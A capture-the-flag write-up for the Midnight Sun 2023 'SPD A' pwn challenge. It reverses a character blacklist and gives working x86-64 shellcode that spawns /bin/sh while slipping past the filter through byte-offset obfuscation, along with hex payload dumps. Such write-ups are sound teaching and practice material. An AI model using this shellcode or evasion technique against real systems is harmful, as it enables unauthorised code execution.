# SPD A

#### Category: speed pwn

Description:
> Author: hfs


**Tags:** pwn, shellcode, Midnight Sun CTF Quals 2023


## Challenge

In this challenge we are given a x86-64bit ELF binary with most security features enabled:
```bash
$ checksec spd_a
[*] './spd_a'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

If we go ahead and run it, we are prompted to enter a `c0de`, the program seems to segfault in we provide some arbitrary input. When inspecting the source of the segmentation fault with gdb, we notice that `rip` is pointing towards an instruction with our provided input. The address of which is located in a `read/execute` memory segment. It would seem that we only need to craft a shellcode that will `execve('/bin/sh')` and thats it.
```bash
Program received signal SIGSEGV, Segmentation fault.
0x000007c580ccf000 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────
*RAX  0xffffffffffffffff
*RBX  0xfffffffffffffffe
*RCX  0xfffffffffffffffd
*RDX  0xfffffffffffffffc
*RDI  0xfffffffffffffffb
*RSI  0xfffffffffffffffa
*R8   0xfffffffffffffff9
*R9   0xfffffffffffffff8
*R10  0xfffffffffffffff7
*R11  0xfffffffffffffff6
*R12  0xfffffffffffffff5
*R13  0xfffffffffffffff4
*R14  0xfffffffffffffff3
*R15  0xfffffffffffffff2
*RBP  0x7fffffffda60 ◂— 0x1
*RSP  0x7fffffffda00 ◂— 0x0
*RIP  0x7c580ccf000 ◂— 'AAAAAAAAAAAAAAAAAA\n'
...

pwndbg> vmmap $rip
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
     0x7c580ccf000      0x7c580cd0000 r-xp     1000      0 [anon_7c580ccf] +0x0
```

So, we test a quick shellcode to see what happens, and get `"nope"` as output. It appears there must be some restrictions to the input.
```asm
xor     rdx, rdx
lea     rbx, [rip+binsh]
mov     rdi, rbx
push    rdx
push    rbx
mov     rsi, rsp
mov     eax, 0x3b
syscall
hang:
    jmp hang

binsh:
    .ascii "/bin/sh\\0"
```

After decompiling the binary, we can immediately spot that certain characters are blacklisted. More specifically, the shellcode cannot contain `/`, `bin`, `sh` and `\0`. From the decompilation, we also understand a bit more about what is going on with the memory mapping. A `r-x` segment with our input in indeed created.

```c
void *addr = (void *)((unsigned __int64)addr & 0x7FFFFFFFF000LL);
char *buf  = mmap(addr, 0x1000uLL, 3, 50, -1, 0LL);
...
int input_size = read(0, buf, 0x1000uLL);
...
for (size_t i = 0; i < input_size; ++i ) {
    if ( buf[i] == 47 # /
        || buf[i] == 98 && buf[i + 1] == 105 && buf[i + 2] == 110 # bin
        || buf[i] == 115 && buf[i + 1] == 104 # sh
        || !buf[i] ) # \0
    {
        puts("nope");
        return 1;
    }
}

if ( mprotect(buf, 0x1000uLL, 5) == -1 ){ // PROT_READ | PROT_EXEC
    perror("mprotect failed");
    return 1;
} else {
    return -1;
}
```

To understand how the control flow ends up at the `buf` segment, we need to look at the assembly at the end of the `main` function. The address of `buf` is pushed on to the stack, then, all the registers are cleared (probably to avoid leaking information), finally the program returns. A `RET` is equivalent to a `POP RIP`, thus, `RIP = buf`:

```asm 
00101545 48 8b 45 b8     MOV        RAX,qword ptr [RBP + buf]
00101549 50              PUSH       RAX
0010154a 48 c7 c0        MOV        RAX,-0x1
         ff ff ff ff
00101551 48 c7 c3        MOV        RBX,-0x2
         fe ff ff ff
00101558 48 c7 c1        MOV        RCX,-0x3
         fd ff ff ff
0010155f 48 c7 c2        MOV        RDX,-0x4
         fc ff ff ff
00101566 48 c7 c7        MOV        RDI,-0x5
         fb ff ff ff
0010156d 48 c7 c6        MOV        RSI,-0x6
         fa ff ff ff
00101574 49 c7 c0        MOV        R8,-0x7
         f9 ff ff ff
0010157b 49 c7 c1        MOV        R9,-0x8
         f8 ff ff ff
00101582 49 c7 c2        MOV        R10,-0x9
         f7 ff ff ff
00101589 49 c7 c3        MOV        R11,-0xa
         f6 ff ff ff
00101590 49 c7 c4        MOV        R12,-0xb
         f5 ff ff ff
00101597 49 c7 c5        MOV        R13,-0xc
         f4 ff ff ff
0010159e 49 c7 c6        MOV        R14,-0xd
         f3 ff ff ff
001015a5 49 c7 c7        MOV        R15,-0xe
         f2 ff ff ff
001015ac c3              RET        /* POP RIP */
```

Now that we have understood how the program works, all we need to do is inject a nicely crafted shellcode that will bypass the blacklist check. To achieve that, we just need to slightly obfuscate our `/bin/sh`. This is simply done by adding 1 to each byte of the `"/bin/sh\\0"` string, which will be reverted by the shellcode. 

```asm
xor     rdx, rdx
lea     rbx, [rip+binsh]        # Memory is r-x
sub     byte ptr [rbx+0], 0x1
sub     byte ptr [rbx+1], 0x1
sub     byte ptr [rbx+2], 0x1
sub     byte ptr [rbx+3], 0x1
sub     byte ptr [rbx+4], 0x1
sub     byte ptr [rbx+5], 0x1
sub     byte ptr [rbx+6], 0x1
sub     byte ptr [rbx+7], 0x1
mov     rdi, rbx
push    rdx
push    rbx
mov     rsi, rsp
mov     eax, 0x3b               # Null bytes in this instruction
syscall
hang:
    jmp hang
binsh:                          # !! is readonly
    .ascii "/0cjo0ti\1"
```

Payload:
```
Sent 0x1000 bytes:
                                    v   v  v
    00000000  48 31 d2 48  8d 1d 30 00  00 00 80 2b  01 80 6b 01  │H1·H│··0·│···+│··k·│
    00000010  01 80 6b 02  01 80 6b 03  01 80 6b 04  01 80 6b 05  │··k·│··k·│··k·│··k·│
    00000020  01 80 6b 06  01 80 6b 07  01 48 89 df  52 53 48 89  │··k·│··k·│·H··│RSH·│
                       v   v  v
    00000030  e6 b8 3b 00  00 00 0f 05  eb fe 2f 30  63 6a 6f 30  │··;·│····│··/0│cjo0│
    00000040  74 69 01 90  90 90 90 90  90 90 90 90  90 90 90 90  │ti··│····│····│····│
    00000050  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
```

We are a step closer, but, the issue with the previous shellcode is that we forgot that the memory segment is `r-x`. Which means that we cannot directly modify the `binsh` text. Also the shellcode contains some *Null bytes* which are also caught by the check.

## Solution 

To fix our non writable memory problem, we simply hardcode the obfuscated string into a register, push it to the stack (`rw-`), and modify it there. As for the 2nd issue, by replacing the `LEA` instruction we already got rid of some null bytes, we additionally modify the end of the shellcode (see comments) and we are all set.


```asm
xor     rdx, rdx
mov     rbx, 0x16974306f6a6330  # hex(u64(b'0cjo0ti\1')) -- i.e. /bin/shNULL + 1 on every byte 
push    rbx
mov     rbx, rsp
sub     byte ptr [rbx+0], 0x1
sub     byte ptr [rbx+1], 0x1
sub     byte ptr [rbx+2], 0x1
sub     byte ptr [rbx+3], 0x1
sub     byte ptr [rbx+4], 0x1
sub     byte ptr [rbx+5], 0x1
sub     byte ptr [rbx+6], 0x1
sub     byte ptr [rbx+7], 0x1
mov     rdi, rbx
push    rdx
push    rbx
mov     rsi, rsp
xor     eax, eax                # Removed null byte
mov     al, 0x3b                # Removed null byte
syscall
hang:
    jmp hang
```

The new payload without null bytes:
```
Sent 0x1000 bytes:
    00000000  48 31 d2 48  bb 30 63 6a  6f 30 74 69  01 53 48 89  │H1·H│·0cj│o0ti│·SH·│
    00000010  e3 80 2b 01  80 6b 01 01  80 6b 02 01  80 6b 03 01  │··+·│·k··│·k··│·k··│
    00000020  80 6b 04 01  80 6b 05 01  80 6b 06 01  80 6b 07 01  │·k··│·k··│·k··│·k··│
    00000030  48 89 df 52  53 48 89 e6  31 c0 b0 3b  0f 05 eb fe  │H··R│SH··│1··;│····│
    00000040  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
```

Success! We got the flag! Well kinda... server was closed and I forgot to save it...
```bash
$ python3 exploit.py
[*] './spd_a'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './spd_a': pid 293718
[*] Switching to interactive mode
$ cat flag
TODO:
```
